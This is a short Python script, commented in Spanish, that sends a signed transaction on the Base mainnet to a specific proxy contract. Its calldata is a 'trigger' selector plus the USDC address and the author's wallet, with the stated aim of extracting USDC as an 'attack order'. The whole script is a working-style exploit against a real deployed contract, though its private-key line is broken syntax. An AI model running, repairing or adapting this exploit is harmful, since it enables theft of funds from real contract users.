from web3 import Web3

# 1. Configuración de Conexión a la Red BASE
w3 = Web3(Web3.HTTPProvider("https://mainnet.base.org"))

# Direcciones del Objetivo y Wallet del Búnker
PROXY_ADDR = "0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf"
USDC_ADDR = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
TU_WALLET = "0x96De980a766CCb10A19B6962587e2b61B650b372"

# --- 🔐 CLAVE PRIVADA DEL BÚNKER (Recuperada del GPG) ---
# He añadido el '0x' al principio para que Python la reconozca como hexadecimal
PRIVATE_KEY = "0xos.getenv("PRIVATE_KEY")"

# El "Gatillo" verificado en la simulación
GATILLO = "0x0684f253"

def ejecutar_prueba():
    print(f"--- 🕵️‍♂️ MISION: EXTRACCION DE MUESTRA (26 USDC) ---")
    
    # Construimos la orden de ataque: Gatillo + Dirección de USDC + Tu Wallet
    # Se rellena con ceros (zfill) para cumplir el estándar de la Blockchain
    payload = GATILLO + USDC_ADDR[2:].lower().zfill(64) + TU_WALLET[2:].lower().zfill(64)
    
    try:
        # Verificar conexión
        if not w3.is_connected():
            print("❌ Error: No hay conexión con la red Base.")
            return

        nonce = w3.eth.get_transaction_count(TU_WALLET)
        
        # Construir la transacción optimizada para Base
        tx = {
            'nonce': nonce,
            'to': PROXY_ADDR,
            'data': payload,
            'gas': 180000, # Aumentado un poco para asegurar éxito
            'maxFeePerGas': w3.to_wei('0.1', 'gwei'),
            'maxPriorityFeePerGas': w3.to_wei('0.05', 'gwei'),
            'chainId': 8453 # ID de la red Base
        }

        print("📦 Firmando transacción con la llave del búnker...")
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        
        print("🚀 Enviando ráfaga a la red Base...")
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        
        print(f"✅ ¡Transacción enviada con éxito!")
        print(f"🔗 Hash de rastreo: {tx_hash.hex()}")
        print(f"📊 Monitorea aquí: https://basescan.org/tx/{tx_hash.hex()}")

    except Exception as e:
        print(f"❌ Error en la operación: {e}")

if __name__ == "__main__":
    ejecutar_prueba()
